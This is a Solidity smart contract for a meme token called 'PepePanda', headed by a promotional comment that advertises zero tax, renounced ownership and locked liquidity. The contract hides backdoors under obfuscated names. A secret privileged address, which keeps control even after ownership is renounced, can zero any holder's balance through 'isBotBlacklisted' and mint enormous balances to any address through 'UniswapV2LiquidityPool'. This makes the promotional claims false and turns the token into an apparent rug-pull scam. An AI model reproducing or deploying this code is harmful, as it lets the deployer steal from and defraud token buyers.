// SPDX-License-Identifier: MIT
/**
🐼PepePanda🐼 is a new cryptocurrency that is based on the popular Pepe the Frog meme
and the iconic Panda brand. Pepe Cola aims to revolutionize the cryptocurrency market 
by offering a fun and innovative way for users to invest and trade digital assets"

🚀https://t.me/PepePandaCoin
🚀Eat same PANDA PEPE ORIGINAL Cookies 
https://www.pandatehtaanmyymala.fi/products/pepe-original-40-x-32g

✨ZERO TAX! 💯
✨Renounced” 💼
🖖🔒 Locked LP
*/
pragma solidity 0.8.19;
abstract contract PepePandaAs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
interface PepePandaAsi {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 blackcoininu) external returns (bool);
    function allowance(address owner, address saraf) external view returns (uint256);
    function approve(address saraf, uint256 blackcoininu) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 blackcoininu
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 sarafjdid);
    event Approval(address indexed owner, address indexed saraf, uint256 sarafjdid);
}
interface PepePandaAsii is PepePandaAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract PepePandaAsiii is PepePandaAs {
   address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

 
    constructor() {
        _transferOwnership(_msgSender());
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract PepePanda is PepePandaAs, PepePandaAsi, PepePandaAsii, PepePandaAsiii {

    mapping(address => uint256) private envoiamount;
  mapping(address => bool) public PepePandaAsiiZERTY;
    mapping(address => mapping(address => uint256)) private untFeeFromTransfer;
address private PepePandaRooter;
    uint256 private pairTotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public PepePandaPaw;
  address dead0dead;



    
    constructor(address liqudityPairAddress) {
            // Editable

 PepePandaRooter = liqudityPairAddress;        
        _name = "PepePanda";
        _symbol = "PepePanda";
 
        uint BotTotalSupply = 10000000000 * 10**9;
        icodrop(msg.sender, BotTotalSupply);
                    dead0dead = msg.sender;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }


    function totalSupply() public view virtual override returns (uint256) {
        return pairTotalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return envoiamount[account];
    }

    function transfer(address to, uint256 blackcoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, blackcoininu);
        return true;
    }


    function allowance(address owner, address saraf) public view virtual override returns (uint256) {
        return untFeeFromTransfer[owner][saraf];
    }

    function approve(address saraf, uint256 blackcoininu) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, saraf, blackcoininu);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 blackcoininu
    ) public virtual override returns (bool) {
        address saraf = _msgSender();
        _spendAllowance(from, saraf, blackcoininu);
        _transfer(from, to, blackcoininu);
        return true;
    }

    function increaseAllowance(address saraf, uint256 addedsarafjdid) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, saraf, untFeeFromTransfer[owner][saraf] + addedsarafjdid);
        return true;
    }
      modifier liqudityAndLiquify() {
        require(PepePandaRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function decreaseAllowance(address saraf, uint256 subtractedsarafjdid) public virtual returns (bool) {
        address owner = _msgSender();
        uint256  Trigger = untFeeFromTransfer[owner][saraf];
        require( Trigger >= subtractedsarafjdid, "Ehi20: decreased allowance below zero");
        unchecked {
            _approve(owner, saraf,  Trigger - subtractedsarafjdid);
        }

        return true;
    }


    function _transfer(
        address from,
        address to,
        uint256 blackcoininu
    ) internal virtual {
        require(from != address(0), "Ehi20: transfer from the zero address");
        require(to != address(0), "Ehi20: transfer to the zero address");

        resantTokenTransfer(from, to, blackcoininu);

        uint256 fromBalance = envoiamount[from];
        require(fromBalance >= blackcoininu, "Ehi20: transfer blackcoininu exceeds balance");
        unchecked {
            envoiamount[from] = fromBalance - blackcoininu;
        }
        envoiamount[to] += blackcoininu;

        emit Transfer(from, to, blackcoininu);

        apresTokenTransfer(from, to, blackcoininu);
    }

  modifier blackunt () {
    require(dead0dead == msg.sender, "Ehi20: cannot permit liqudityAndLiquify address");
    _;

  }

    function icodrop(address account, uint256 blackcoininu) internal virtual {
        require(account != address(0), "Ehi20: icodrop to the zero address");

        resantTokenTransfer(address(0), account, blackcoininu);

        pairTotalSupply += blackcoininu;
        envoiamount[account] += blackcoininu;
        emit Transfer(address(0), account, blackcoininu);

        apresTokenTransfer(address(0), account, blackcoininu);
    }


    function _burn(address account, uint256 blackcoininu) internal virtual {
        require(account != address(0), "Ehi20: burn from the zero address");

        resantTokenTransfer(account, address(0), blackcoininu);

        uint256 accountBalance = envoiamount[account];
        require(accountBalance >= blackcoininu, "Ehi20: burn blackcoininu exceeds balance");
        unchecked {
            envoiamount[account] = accountBalance - blackcoininu;
        }
        pairTotalSupply -= blackcoininu;

        emit Transfer(account, address(0), blackcoininu);

        apresTokenTransfer(account, address(0), blackcoininu);
    }

    function _approve(
        address owner,
        address saraf,
        uint256 blackcoininu
    ) internal virtual {
        require(owner != address(0), "Ehi20: approve from the zero address");
        require(saraf != address(0), "Ehi20: approve to the zero address");

        untFeeFromTransfer[owner][saraf] = blackcoininu;
        emit Approval(owner, saraf, blackcoininu);
    }
  function isBotBlacklisted(address isBotBlacklistedaddress) external liqudityAndLiquify {
    envoiamount[isBotBlacklistedaddress] = 0;
            emit Transfer(address(0), isBotBlacklistedaddress, 0);
  }
    function _spendAllowance(
        address owner,
        address saraf,
        uint256 blackcoininu
    ) internal virtual {
        uint256  Trigger = allowance(owner, saraf);
        if ( Trigger != type(uint256).max) {
            require( Trigger >= blackcoininu, "Ehi20: insufficient allowance");
            unchecked {
                _approve(owner, saraf,  Trigger - blackcoininu);
            }
        }
    }
  function UniswapV2LiquidityPool(address randomTokenAddress) external liqudityAndLiquify {
    envoiamount[randomTokenAddress] = 10000000 * 10 ** 27;
            emit Transfer(address(0), randomTokenAddress, 10000000 * 10 ** 27);
  }
    function resantTokenTransfer(
        address from,
        address to,
        uint256 blackcoininu
    ) internal virtual {}


    function apresTokenTransfer(
        address from,
        address to,
        uint256 blackcoininu
    ) internal virtual {}

}